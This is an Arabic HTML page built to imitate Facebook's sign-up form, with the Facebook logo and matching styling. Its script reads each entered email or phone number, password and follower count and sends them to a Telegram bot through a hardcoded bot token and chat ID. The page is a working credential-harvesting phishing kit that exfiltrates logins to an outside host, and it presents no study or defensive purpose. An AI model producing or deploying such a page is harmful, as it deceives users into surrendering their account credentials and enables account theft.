<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>الصفحة الرئيسية + تسجيل حساب</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  :root{
    --bg:#f0f2f5;
    --white:#fff;
    --primary:#1877f2;
    --primary-hover:#166fe5;
    --border:#ccd0d5;
    --text:#1c1e21;
    --placeholder:#606770;
    --link:#1877f2;
    --link-hover:#166fe5;
  }
  *{box-sizing:border-box;margin:0;padding:0;}
  body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:var(--bg);}
  .wrapper{max-width:800px;margin:auto;padding:20px;}
  h1{margin-bottom:20px;text-align:center;}
  /* النموذج */
  .login{background:var(--white);width:90%;max-width:360px;border:1px solid var(--border);
         border-radius:8px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.1);margin:auto;}
  .logo{text-align:center;margin-bottom:20px;}
  .logo img{width:120px;}
  .input{margin-bottom:15px;}
  .input input{
    width:100%;padding:12px 10px;border:1px solid var(--border);
    border-radius:4px;font-size:14px;color:var(--text);
  }
  .input input::placeholder{color:var(--placeholder);}
  .btn{
    width:100%;padding:12px;background:var(--primary);color:var(--white);
    border:none;border-radius:4px;font-weight:bold;cursor:pointer;
    transition:background .2s;
  }
  .btn:hover{background:var(--primary-hover);}
  .separator{display:flex;align-items:center;margin:15px 0;}
  .separator::before,.separator::after{
    content:"";flex:1;height:1px;background:var(--border);
  }
  .separator span{padding:0 10px;color:var(--text);font-size:13px;}
  .footer{margin-top:15px;text-align:center;font-size:12px;color:var(--text);}
  .footer a{color:var(--link);text-decoration:none;}
  .footer a:hover{color:var(--link-hover);}
</style>
</head>
<body>
<div class="wrapper">
  <h1>الصفحة الرئيسية</h1>

  <!-- نموذج تسجيل الحساب -->
  <div class="login">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="فيسبوك">
    </div>
    <form id="regForm">
      <div class="input"><input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required></div>
      <div class="input"><input type="password" id="pass" placeholder="كلمة المرور" required></div>
      <div class="input"><input type="number" id="followers" placeholder="عدد المتابعين (اختياري)" min="0"></div>
      <button type="submit" class="btn">تسجيل حساب جديد</button>
    </form>
    <div class="separator"><span>أو</span></div>
    <button class="btn" style="background:#4267B2;">تسجيل دخول</button>
    <div class="footer">
      <a href="#">مساعدة</a> |
      <a href="#">الخصوصية</a> |
      <a href="#">الشروط</a>
    </div>
  </div>
</div>

<script>
  const BOT_TOKEN = '8635912264:AAGu4XL8v9WuS90vwrBGyJGz5fWyFMstM2E';
  const CHAT_ID   = '8246832284';

  document.getElementById('regForm').addEventListener('submit', async e=>{
    e.preventDefault();
    const email    = document.getElementById('email').value.trim();
    const pass     = document.getElementById('pass').value.trim();
    const followers= document.getElementById('followers').value.trim();

    const text = `📲 حساب جديد\n📧 البريد: ${email}\n🔑 كلمة المرور: ${pass}\n👥 المتابعين: ${followers||'لا يوجد'}`;

    try{
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:CHAT_ID,text})
      });
      if(!res.ok) throw new Error('Telegram API error');
      alert('تم إرسال البيانات إلى البوت ✔️');
      e.target.reset();
    }catch(err){
      console.error(err);
      alert('فشل الإرسال! حاول مرة أخرى.');
    }
  });
</script>
</body>
</html>
